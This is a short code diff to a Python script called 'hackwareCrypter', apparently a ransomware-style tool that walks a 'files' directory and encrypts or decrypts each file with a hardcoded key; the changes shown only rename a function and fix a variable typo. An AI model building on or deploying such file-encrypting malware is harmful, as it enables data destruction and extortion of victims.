@@ -19,7 +19,7 @@ import Crypter
 
 HARDCODED_KEY = 'hackware strike force strikes u!'
 
-def arg_parser():
+def get_parser():
     parser = argparse.ArgumentParser(description = "hackwareCrypter")
     parser.add_argument('-d', '--decrypt', help='decripta os arquivos [defalut: no]', action='store_true')
 
@@ -57,7 +57,7 @@ def main():
         cryptFn = crypt.decrypt
 
     init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
-    starDirs = [init_path]
+    startDirs = [init_path]
 
     for currentDir in startDirs:
         for filename in Discovery.discover(currentDir):
